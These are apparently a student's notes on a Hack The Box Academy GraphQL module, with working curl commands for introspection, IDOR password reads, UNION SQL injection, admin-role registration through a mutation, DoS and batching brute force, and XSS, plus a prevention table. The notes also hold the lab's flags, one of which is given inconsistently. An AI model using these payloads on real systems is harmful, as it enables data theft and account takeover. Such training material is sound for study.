# HTB Academy — Attacking GraphQL Module Notes

**Module:** Attacking GraphQL (Sections 1–9)  
**Topics:** GraphQL Fundamentals | Introspection | Enumeration | Injection | Auth Bypass | Batching Attacks | Tooling

## Flags Summary

| Section | Attack | Flag |
|---------|--------|------|
| 2 — Information Disclosure | Authenticated introspection → `secrets` query → `SecretObject.secret` | `HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}` |
| 3 — IDOR | `user(username: "admin") { password }` | `HTB{79ebbbce53f40edf75c667ef6fd36fae}` |
| 4 — SQL Injection | UNION into `flag` table via `user(username:)` arg | `HTB{1105f1d9480ac244a0c8f2bc47594581}` |
| 6 — Mutations | Register `role: "admin"` user → access `/admin` | `HTB{f7082828b5e5ad40d955846ba415d17f}` |

---

## Section 1: Introduction to GraphQL

### What GraphQL Is

GraphQL is a query language for APIs — an alternative to REST. Key characteristic: **single endpoint** handles all operations (reads, writes, deletes), unlike REST which uses multiple resource-specific endpoints.

**Common endpoint locations:**
- `/graphql`
- `/api/graphql`
- `/graphql/v1`, `/v1/graphql` (variations)

### Query Syntax

Queries select **fields of objects**. The object type and available fields are defined by the backend schema.

**Basic query — select fields from all objects:**
```graphql
{
  users {
    id
    username
    role
  }
}
```

**Filtered query — pass arguments:**
```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

**Sub-querying — nested objects:**
```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

**Response structure mirrors the query structure** — same field names, same nesting.

### Attacker Relevance

- Single endpoint = single target for all data operations
- Schema defines all available queries, mutations, types — **introspection can reveal the entire API surface**
- Fields can include sensitive data (passwords, tokens, PII) — just query them if access control is missing
- REST APIs have distinct endpoints per resource; GraphQL collapses everything into one — easier to enumerate once you know how

---

---

## Section 2: Information Disclosure

### Fingerprinting the GraphQL Engine

**Tool:** `graphw00f` — sends malformed queries and reads error behavior to identify the backend engine.

```bash
python3 main.py -d -f -t http://<TARGET>
# -d = detect mode, -f = fingerprint mode
# Auto-discovers /graphql, /api/graphql, etc.
```

Output includes: engine name, technology stack, link to [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) entry for that engine (which lists default-on features like introspection and batch support).

**Check for GraphiQL UI:** Browse to `/graphql` directly — many deployments expose GraphiQL, which lets you run queries without worrying about JSON escaping.

---

### Introspection

GraphQL's built-in self-documentation feature. Queries the `__schema` field to reveal the full API surface.

**List all types:**
```graphql
{ __schema { types { name description } } }
```

**Dump all fields of a specific type:**
```graphql
{ __type(name: "UserObject") { name fields { name type { name kind } } } }
```

**List all supported queries:**
```graphql
{ __schema { queryType { fields { name description } } } }
```

**Full introspection dump (paste into GraphQL Voyager to visualize):**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind name description
      fields(includeDeprecated: true) {
        name description isDeprecated deprecationReason
        args { name description defaultValue
               type { kind name ofType { kind name } } }
        type { kind name ofType { kind name } }
      }
      inputFields { name description defaultValue
                    type { kind name ofType { kind name } } }
      enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
    }
    directives { name description locations
                 args { name description defaultValue type { kind name } } }
  }
}
```

**Visualize schema:** Paste full introspection result into [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/) (self-host for real engagements).

---

### Information Disclosure Attack Chain

1. Fingerprint engine with `graphw00f`
2. Run full introspection dump → identify all types and their fields
3. Look for sensitive fields exposed by the schema: `password`, `token`, `secret`, `apiKey`, `ssn`, etc.
4. Query those fields directly — access control may not be enforced at the field level

**Exercise result:**
- Introspection revealed `UserObject` has fields: `uuid, id, username, password, role, msg, posts`
- Queried `{ users { username role password } }` with no authentication
- All passwords returned in plaintext, including admin's

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username role password } }"}' \
  | python3 -m json.tool
```

**Flag:** `HTB{79ebbbce53f40edf75c667ef6fd36fae}`

**Key lesson:** Introspection tells you every field that exists. If the API doesn't enforce field-level authorization, you can just query sensitive fields directly — no exploitation needed beyond a simple introspection read.

**Critical:** Always authenticate before running introspection. The unauthenticated schema hid `SecretObject` and the `secrets` query entirely. Authenticated introspection revealed them.

**Full authenticated attack chain (exercise):**
1. Login via POST to `/` → get session cookie
2. `{ __schema { types { name } } }` → revealed `SecretObject` (absent unauthenticated)
3. `{ __type(name: "SecretObject") { name fields { name type { name kind } } } }` → fields: `id`, `secret`
4. `{ __schema { queryType { fields { name description } } } }` → found `secrets` query
5. `{ secrets { id secret } }` → flag returned

```bash
# Login
curl -s -c /tmp/cookies.txt -X POST http://<TARGET>/ \
  -d "username=htb-stdnt&password=AcademyStudent!" -L -o /dev/null

# Enumerate all types (authenticated)
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool

# Inspect custom type
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"SecretObject\") { name fields { name type { name kind } } } }"}' \
  | python3 -m json.tool

# Find the query that returns it
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' \
  | python3 -m json.tool

# Exfiltrate
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ secrets { id secret } }"}' | python3 -m json.tool
```

**Flag (Section 2):** `HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}`

---

## Section 3: Insecure Direct Object Reference (IDOR)

GraphQL queries often accept object identifiers (like `username`) as arguments. If the backend doesn't verify that the requesting user is authorized to access the requested object, any authenticated user can enumerate other users' data.

### Identifying IDOR

The app queries the current user's profile via:
```graphql
{ user(username: "htb-stdnt") { id username msg role } }
```

Test by substituting a different username — if data is returned without error, IDOR is confirmed:
```graphql
{ user(username: "test") { id username msg role } }
```

### Exploiting IDOR

1. Run introspection to find all fields on `UserObject`:
```graphql
{ __type(name: "UserObject") { name fields { name type { name kind } } } }
```
→ Reveals `password` field exists

2. Query another user's password directly:
```graphql
{ user(username: "admin") { username password } }
```

```bash
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(username: \"admin\") { username password } }"}' \
  | python3 -m json.tool
```

**Flag (Section 3 — admin password via IDOR):** `HTB{79ebbbce53f40edf75c667ef6fd36fae}`

**Key lesson:** GraphQL field-level authorization must be enforced per-field AND per-object. Knowing a field exists (via introspection) + no object-level auth check = full data exfiltration on any object.

---

---

## Section 4: Injection Attacks

### SQL Injection via GraphQL Arguments

GraphQL arguments passed unsanitized to SQL queries are vulnerable to SQLi. Identify which queries take arguments by sending them without args — a 400 error names the required argument.

**Confirm SQLi — comment out the rest of the query:**
```graphql
{ user(username: "htb-stdnt --") { uuid username role } }
# Returns normal result → SQLi likely (comment ignored rest of WHERE clause)

{ user(username: "htb-stdnt'") { uuid username role } }
# Returns SQL syntax error → confirmed SQLi
```

**UNION-based exfiltration pattern:**
- `UserObject` has 6 fields (uuid, id, username, password, role, msg) → UNION needs 6 columns
- `username` is the 3rd field → reflected in column position 3
- Use `GROUP_CONCAT` to collapse multiple rows into one

```bash
# Step 1: Enumerate tables
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
# Result: user,secret,flag,post

# Step 2: Enumerate columns of target table
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
# Result: id,flag

# Step 3: Dump the data
cat > /tmp/q.json << 'EOF'
{"query":"{ user(username: \"x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -\") { username } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
```

**Key lesson:** GraphQL is just a transport layer — if arguments hit a SQL query without sanitization, standard UNION-based SQLi applies. The schema (via introspection) tells you how many columns the object has, which determines the UNION column count.

**Flag (Section 4):** `HTB{1105f1d9480ac244a0c8f2bc47594581}`

### XSS via GraphQL Error Messages

If a query argument of the wrong type is reflected in an error message without encoding, XSS may occur:
```graphql
{ post(id: "<script>alert(1)</script>") { id title } }
# Error: "invalid id value <script>alert(1)</script>"
```
Only exploitable if the error is rendered in a browser context without sanitization.

---

---

## Section 5: DoS & Batching Attacks

### DoS via Circular Query (Depth Amplification)

GraphQL schemas with circular references between types can be exploited by deeply nesting the loop in a query. The response grows exponentially with each iteration.

**Identify the loop via Voyager:** `UserObject.posts` → `PostObject.author` → back to `UserObject` — infinite cycle.

**Basic loop query (confirm it works):**
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```
Note: `posts` on a `UserObject` is a connection type — must traverse `edges { node { ... } }` to get to the `PostObject`.

**Deep nested query crashes the server** — repeat the loop many more times to exhaust backend resources.

**Prevention:** Query depth limits and query cost analysis on the backend.

---

### Batching Attacks

GraphQL supports sending multiple queries in a single HTTP request as a JSON array:

```http
POST /graphql HTTP/1.1
Content-Type: application/json

[
    {"query":"{user(username: \"admin\") {uuid}}"},
    {"query":"{post(id: 1) {title}}"}
]
```

Response returns an array with one result per query.

**Security impact — brute-force bypass:**
- Rate limit: 5 req/sec → normally 5 password attempts/sec
- With batching: pack 1000 login queries into 1 request → 5000 attempts/sec
- Rate limit is measured per HTTP request, not per GraphQL query → batching renders it ineffective

**When to look for batching:** Any GraphQL endpoint used for authentication (login mutations). Check if the server accepts a JSON array instead of a single JSON object.

**Prevention:** Disable batching, or apply rate limits per GraphQL operation rather than per HTTP request.

---

---

## Section 6: Mutations

### What are Mutations

Mutations are GraphQL's write operations — create, update, delete. Enumerate them via introspection the same way as queries.

**Enumerate all mutations and their args:**
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type { ...TypeRef }
        }
      }
    }
  }
}
# (use TypeRef fragment from full introspection query)
```

**Enumerate input object fields:**
```graphql
{ __type(name: "RegisterUserInput") { name inputFields { name description defaultValue } } }
```

### Exploitation — Privilege Escalation via Mutation Input

If a mutation accepts a `role` argument for new users and doesn't validate it server-side, you can register an admin-role user directly.

**Attack chain:**
1. Enumerate mutations → find `registerUser(input: RegisterUserInput)`
2. Enumerate `RegisterUserInput` → fields: `username`, `password`, `role`, `msg`
3. Hash password: `echo -n 'password' | md5sum` → `5f4dcc3b5aa765d61d8327deb882cf99`
4. Register admin user:

```bash
cat > /tmp/q.json << 'EOF'
{"query":"mutation { registerUser(input: {username: \"vautiaAdmin\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"Hacked!\"}) { user { username password msg role } } }"}
EOF
curl -s -b /tmp/cookies.txt -X POST http://<TARGET>/graphql \
  -H "Content-Type: application/json" -d @/tmp/q.json | python3 -m json.tool
```

5. Login as new admin user:
```bash
curl -s -c /tmp/admin_cookies.txt -X POST http://<TARGET>/ \
  -d "username=vautiaAdmin&password=password" -L -o /dev/null
```

6. Access admin endpoint:
```bash
curl -s -b /tmp/admin_cookies.txt http://<TARGET>/admin | grep -i "htb\|flag"
```

**Key lesson:** Always check mutation input fields for privilege-related parameters (`role`, `isAdmin`, `permissions`). If the backend doesn't enforce server-side validation, you can self-assign any role during registration.

**Flag (Section 6):** `HTB{f7082828b5e5ad40d955846ba415d17f}`

---

---

## Section 7: Tools of the Trade

### graphw00f
Fingerprints the GraphQL engine by sending malformed queries and reading error behavior.
```bash
python3 main.py -d -f -t http://<TARGET>
```

### GraphQL-Voyager
Visualizes the full schema from an introspection dump. Paste the introspection JSON into the demo at `graphql-kit.com/graphql-voyager/`. Self-host for real engagements.

### GraphQL-Cop
Security audit tool — runs automated checks against a GraphQL endpoint and flags misconfigurations.
```bash
python3 graphql-cop.py -t http://<TARGET>/graphql
```

**Common findings:**
| Severity | Finding | Risk |
|----------|---------|------|
| HIGH | Alias Overloading (100+ aliases) | DoS |
| HIGH | Array-based Query Batching (10+ queries) | DoS / brute-force bypass |
| HIGH | Directive Overloading | DoS |
| HIGH | Field Duplication (500 repeated fields) | DoS |
| HIGH | Introspection enabled | Information leakage |
| MEDIUM | GET method query support | CSRF |
| MEDIUM | POST url-encoded query | CSRF |
| LOW | Field Suggestions enabled | Information leakage |
| LOW | GraphiQL exposed | Information leakage |

### InQL (Burp Extension)
- Install via BApp Store in Burp
- Adds GraphQL tab in Proxy History and Repeater — edit queries without dealing with JSON escaping
- Right-click a GraphQL request → Extensions > InQL > Generate queries with InQL Scanner → auto-runs introspection and lists all queries/mutations with pre-built templates

---

---

## Section 8: Vulnerability Prevention

| Vulnerability | Mitigation |
|---------------|-----------|
| Information disclosure | Disable introspection in production; use generic error messages; audit introspection for sensitive data leakage |
| SQL/Command/XSS injection | Strict input validation; treat all user input as untrusted; prefer allowlists over denylists |
| DoS (circular queries) | Query depth limits; maximum query size limits; query cost analysis |
| Batching brute-force bypass | Disable batching if not needed; if required, limit query depth; apply rate limits per GraphQL operation not per HTTP request |
| IDOR / broken access control | Authenticate all GraphQL endpoints where possible; enforce object-level authorization checks per query |
| Mutation privilege escalation | Validate and enforce role assignment server-side; never trust client-provided role/permission values |

Reference: [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

---

<!-- Section 9 (Skills Assessment) will be added next -->
